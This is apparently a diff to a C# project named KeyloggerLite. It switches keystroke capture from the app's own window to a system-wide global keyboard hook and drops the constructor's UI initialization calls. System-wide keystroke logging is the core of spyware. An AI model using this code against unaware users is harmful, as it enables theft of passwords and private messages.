@@ -8,13 +8,14 @@ namespace KeyloggerLite
     {
         private readonly UIManager uiManager;
         private readonly KeyLogger keyLogger;
-
+        private readonly GlobalKeyboardHook globalHook;
         public MainForm()
         {
             keyLogger = new KeyLogger();
             uiManager = new UIManager(this, keyLogger);
-            InitializeComponent();
-            uiManager.InitializeUI();
+            globalHook = new GlobalKeyboardHook();
+            globalHook.KeyPressed += OnGlobalKeyPressed;
+            globalHook.Start();
         }
 
         public KeyLogger KeyLogger => keyLogger;
@@ -27,11 +28,8 @@ namespace KeyloggerLite
             FormBorderStyle = FormBorderStyle.FixedSingle;
             MaximizeBox = false;
             BackColor = ColorTranslator.FromHtml("#CCCCCC");
-            KeyPreview = true;
 
             MouseDown += Form_MouseDown;
-            KeyDown += MainForm_KeyDown;
-            KeyPress += MainForm_KeyPress;
         }
 
         private void Form_MouseDown(object? sender, MouseEventArgs e)
@@ -43,15 +41,20 @@ namespace KeyloggerLite
                 WndProc(ref msg);
             }
         }
+        private void OnGlobalKeyPressed(Keys key)
+        {
+            if (!keyLogger.IsRunning) return;
 
-        private void MainForm_KeyPress(object? sender, KeyPressEventArgs e)
-        {
-            keyLogger.HandleKeyPress(e.KeyChar.ToString());
+             // Модифікатори, службові клавіші (Enter, Shift тощо)
+            if (key < Keys.Space || key > Keys.Z || Control.ModifierKeys != Keys.None)
+                keyLogger.HandleKeyPress($"[{key}]");
+            else
+                keyLogger.HandleKeyPress(key.ToString());
         }
-        private void MainForm_KeyDown(object? sender, KeyEventArgs e)
+        protected override void OnFormClosing(FormClosingEventArgs e)
         {
-            if (e.KeyCode < Keys.Space || e.KeyCode > Keys.Z || e.Modifiers != Keys.None)
-                keyLogger.HandleKeyPress($"[{e.KeyCode}]");
+            globalHook.Stop();
+            base.OnFormClosing(e);
         }
     }
 }
